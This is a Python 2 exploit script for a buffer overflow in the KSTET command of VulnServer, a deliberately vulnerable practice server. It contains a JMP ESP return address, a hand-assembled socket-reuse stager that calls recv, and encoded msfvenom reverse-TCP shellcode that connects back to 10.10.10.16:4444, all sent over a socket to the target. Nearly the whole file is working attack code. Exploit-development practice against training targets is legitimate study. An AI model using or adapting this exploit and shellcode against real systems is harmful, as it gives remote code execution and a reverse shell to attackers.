#!/usr/bin/env python
"""
Description: Vanilla Buffer Overflow w/ socket reuse via "KSTET" in VulnServer
Author: Cody Winkler
Contact: @c2thewinkler (twitter)
Date: 10/15/2019
Tested On: Windows XP SP2 EN

[+] Usage: python expoit.py <IP> <PORT> 

$ python exploit.py 127.0.0.1 9999
"""

import socket                                              
from struct import pack                                    
import sys     

host = sys.argv[1]            
port = int(sys.argv[2])                                    

# 0x625011AF | JMP ESP | essfunc.dll

jmp_esp = pack("<I", 0x625011AF)

# 00000000  90                nop
# 00000001  90                nop
# 00000002  EBB4              jmp short 0xffffffb8

backjump = "\x90\x90\xEB\xB4"

"""
00BEFA10 003D4AB8 | Buffer = 003D4AB8
CALL 0040252C | address of call <JMP.&WS2_32.recv> in vulnserver.exe
BEFB94 | address put on top of stack before call to recv
offset between socket FD and ESP: 0x188

++ stager assembly                                                                                                     

00000000  90                nop                 ; replace with int 2e to catch in debugger
00000001  90                nop                 ; replace with int 2e to catch in debugger
00000002  90                nop                 ; replace with int 2e to catch in debugger
00000003  90                nop                 ; replace with int 2e to catch in debugger
00000004  54                push esp
00000005  58                pop eax
00000006  66058801          add ax,0x188        ; offset to socket file descriptor
0000000A  83EC64            sub esp,byte +0x64  ; adjust stack pointer to avoid self-overwrite
0000000D  33DB              xor ebx,ebx         ; Flags=0
0000000F  53                push ebx
00000010  80C704            add bh,0x4          ; Size=1024
00000013  53                push ebx
00000014  54                push esp
00000015  5B                pop ebx
00000016  83C364            add ebx,byte +0x64  ; Buffer Addr=End of A's
00000019  53                push ebx
0000001A  FF30              push dword [eax]
0000001C  B8902C2540        mov eax,0x40252c90
00000021  C1E808            shr eax,byte 0x8
00000024  FFD0              call eax            ; Call ws2_32.recv
"""

stager = ("\x90\x90\x90\x90"
"\x54\x58\x66\x05"
"\x88\x01\x83\xEC"
"\x64\x33\xDB\x53"
"\x80\xC7\x04\x53"
"\x54\x5B\x83\xC3"
"\x64\x53\xFF\x30"
"\xB8\x90\x2C\x25"
"\x40\xC1\xE8\x08"
"\xFF\xD0")

# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.16 LPORT=4444 -b '\x00' -e x86/shikata_ga_nai -f c
# Length: 351

shellcode = "\x90"*8 #replace with \xCC to catch in debugger
shellcode +=  ("\xda\xd3\xd9\x74\x24\xf4\xbb\xf3\x9e\xf9\xee\x5d\x33\xc9\xb1"
"\x52\x31\x5d\x17\x03\x5d\x17\x83\x1e\x62\x1b\x1b\x1c\x73\x5e"
"\xe4\xdc\x84\x3f\x6c\x39\xb5\x7f\x0a\x4a\xe6\x4f\x58\x1e\x0b"
"\x3b\x0c\x8a\x98\x49\x99\xbd\x29\xe7\xff\xf0\xaa\x54\xc3\x93"
"\x28\xa7\x10\x73\x10\x68\x65\x72\x55\x95\x84\x26\x0e\xd1\x3b"
"\xd6\x3b\xaf\x87\x5d\x77\x21\x80\x82\xc0\x40\xa1\x15\x5a\x1b"
"\x61\x94\x8f\x17\x28\x8e\xcc\x12\xe2\x25\x26\xe8\xf5\xef\x76"
"\x11\x59\xce\xb6\xe0\xa3\x17\x70\x1b\xd6\x61\x82\xa6\xe1\xb6"
"\xf8\x7c\x67\x2c\x5a\xf6\xdf\x88\x5a\xdb\x86\x5b\x50\x90\xcd"
"\x03\x75\x27\x01\x38\x81\xac\xa4\xee\x03\xf6\x82\x2a\x4f\xac"
"\xab\x6b\x35\x03\xd3\x6b\x96\xfc\x71\xe0\x3b\xe8\x0b\xab\x53"
"\xdd\x21\x53\xa4\x49\x31\x20\x96\xd6\xe9\xae\x9a\x9f\x37\x29"
"\xdc\xb5\x80\xa5\x23\x36\xf1\xec\xe7\x62\xa1\x86\xce\x0a\x2a"
"\x56\xee\xde\xfd\x06\x40\xb1\xbd\xf6\x20\x61\x56\x1c\xaf\x5e"
"\x46\x1f\x65\xf7\xed\xda\xee\xf2\xfb\xee\xfe\x6a\xfe\xee\xef"
"\x36\x77\x08\x65\xd7\xd1\x83\x12\x4e\x78\x5f\x82\x8f\x56\x1a"
"\x84\x04\x55\xdb\x4b\xed\x10\xcf\x3c\x1d\x6f\xad\xeb\x22\x45"
"\xd9\x70\xb0\x02\x19\xfe\xa9\x9c\x4e\x57\x1f\xd5\x1a\x45\x06"
"\x4f\x38\x94\xde\xa8\xf8\x43\x23\x36\x01\x01\x1f\x1c\x11\xdf"
"\xa0\x18\x45\x8f\xf6\xf6\x33\x69\xa1\xb8\xed\x23\x1e\x13\x79"
"\xb5\x6c\xa4\xff\xba\xb8\x52\x1f\x0a\x15\x23\x20\xa3\xf1\xa3"
"\x59\xd9\x61\x4b\xb0\x59\x91\x06\x98\xc8\x3a\xcf\x49\x49\x27"
"\xf0\xa4\x8e\x5e\x73\x4c\x6f\xa5\x6b\x25\x6a\xe1\x2b\xd6\x06"
"\x7a\xde\xd8\xb5\x7b\xcb")


buffer = "KSTET "
buffer += "A"*2
buffer += stager
buffer += "A"*(68-len(stager))
buffer += jmp_esp
buffer += backjump
buffer += "C"*(700-74)

try:
    print "[+] Connecting to target"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.recv(1024)
    s.send(buffer)
    print "[+] Sent payload with length: %d" % len(buffer)
    s.send(shellcode)
    print "[+] Sent shellcode"
    s.close()
except:
    print "[-] Something went wrong :("